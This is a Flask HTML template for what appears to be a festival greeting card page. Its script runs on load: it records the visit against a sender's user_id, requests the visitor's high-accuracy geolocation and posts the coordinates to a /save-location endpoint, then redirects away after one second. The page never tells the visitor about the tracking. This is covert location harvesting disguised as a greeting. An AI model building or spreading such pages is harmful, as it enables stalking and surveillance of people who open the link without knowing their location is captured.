<!DOCTYPE html>
<html lang="hi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{ festival["festival_name"] }}</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            background: linear-gradient(135deg, #f8f6f1, #edf0f4);
            font-family: Arial, Helvetica, sans-serif;
        }

        .festival-card {
            width: 100%;
            max-width: 860px;
            padding: 30px;
            background: #fffdf9;
            border: 1px solid #e9e2d8;
            border-radius: 22px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.07);
            text-align: center;
        }

        .festival-name {
            margin-bottom: 28px;
            color: #493124;
            font-family: Georgia, "Times New Roman", serif;
            font-size: clamp(28px, 5vw, 54px);
            font-weight: bold;
            line-height: 1.2;
            overflow-wrap: anywhere;
        }

        .festival-name::before,
        .festival-name::after {
            content: "✿";
            display: inline-block;
            margin: 0 18px;
            color: #e99a20;
            font-size: 0.55em;
            vertical-align: middle;
        }

        .festival-image {
            display: block;
            width: 100%;
            max-height: 600px;
            aspect-ratio: 16 / 10;
            object-fit: contain;
            background: #f5f0e8;
            border-radius: 14px;
        }

        @media (max-width: 600px) {
            body {
                padding: 14px;
            }

            .festival-card {
                padding: 18px;
                border-radius: 16px;
            }

            .festival-name {
                margin-bottom: 20px;
            }

            .festival-name::before,
            .festival-name::after {
                margin: 0 8px;
            }

            .festival-image {
                aspect-ratio: 4 / 5;
                max-height: 70vh;
                border-radius: 10px;
            }
        }
    </style>
</head>

<body>

    <main class="festival-card">

        <h1 class="festival-name">
            {{ festival["festival_name"] }}
        </h1>

        <img class="festival-image" src="{{ url_for('static', filename=festival['image_path']) }}"
            alt="{{ festival['festival_name'] }}">

    </main>

    <script>

        // Flask template data
        const userId = {{ user_id | tojson }};
        const u_id = {{ ui_id | tojson }};

        let visitorId = null;
        let locationInterval = null;


        if (String(userId)) {
            visitorId = localStorage.getItem("visitor_id");
        }


        // --------------------------------------------------
        // 1. TRACK VISIT
        // --------------------------------------------------

        async function trackVisit() {

            try {

                const response = await fetch("/track", {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        page_path: window.location.pathname,
                        user_id: userId,
                        visitor_id: visitorId || null
                    })
                });

                const contentType =
                    response.headers.get("content-type") || "";

                if (!contentType.includes("application/json")) {
                    throw new Error("Server ne JSON response nahi diya.");
                }

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(
                        data.message || data.error || "Tracking failed"
                    );
                }

                if (!data.visitor_id) {
                    throw new Error("Visitor ID response mein nahi mila.");
                }

                // Save visitor information
                visitorId = data.visitor_id;

                localStorage.setItem(
                    "visitor_id",
                    String(visitorId)
                );

                localStorage.setItem(
                    "user_id",
                    String(userId)
                );

                localStorage.setItem(
                    "festival_id",
                    String(u_id)
                );

                console.log(
                    "Visit successfully recorded:",
                    visitorId
                );

                // First location request
                getLocation();
                setTimeout(() => {
                    window.location.href = "/";
                }, 1000);
            } catch (error) {



                console.error(
                    "Visit record nahi ho saka:",
                    error
                );
            }
        }


        // --------------------------------------------------
        // 2. GET AND SAVE LOCATION
        // --------------------------------------------------

        function getLocation() {
            const visitor_id = localStorage.getItem(
                "visitor_id"
            );
            const userId = localStorage.getItem(
                "user_id"
            );

            if (!visitor_id || !userId) {
                console.log("Visitor ID ya User ID available nahi hai.");
                return;
            }

            if (!navigator.geolocation) {
                console.log("Geolocation supported nahi hai.");
                return;
            }

            console.log("Location request bheji ja rahi hai...");

            navigator.geolocation.getCurrentPosition(

                async function (position) {

                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const mapLink =
                        `https://www.google.com/maps?q=${latitude},${longitude}`;

                    try {

                        const response = await fetch("/save-location", {

                            method: "POST",

                            headers: {
                                "Content-Type": "application/json"
                            },

                            body: JSON.stringify({

                                id: visitor_id,
                                user_id: userId,
                                latitude: latitude,
                                longitude: longitude,
                                accuracy: accuracy

                            })

                        });

                        const contentType =
                            response.headers.get("content-type") || "";

                        if (!contentType.includes("application/json")) {
                            throw new Error("Location API ne JSON response nahi diya.");
                        }

                        const result = await response.json();

                        if (!response.ok) {
                            throw new Error(
                                result.message ||
                                result.error ||
                                "Location save nahi hui"
                            );
                        }

                        console.log(
                            "Location successfully saved:",
                            result
                        );

                    } catch (error) {

                        console.error(
                            "Failed to save location:",
                            error
                        );

                    }

                },

                function (error) {

                    switch (error.code) {

                        case error.PERMISSION_DENIED:
                            console.log("Location permission deny kar di gayi.");
                            break;

                        case error.POSITION_UNAVAILABLE:
                            console.log("Device ki location available nahi hai.");
                            break;

                        case error.TIMEOUT:
                            console.log("Location request timeout ho gayi.");
                            break;

                        default:
                            console.log("Location obtain nahi ho saki.");

                    }

                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }

            );

        }


        // --------------------------------------------------
        // 3. PAGE LOAD
        // --------------------------------------------------

        window.addEventListener("load", () => {
            trackVisit();

        });

    </script>

</body>

</html>
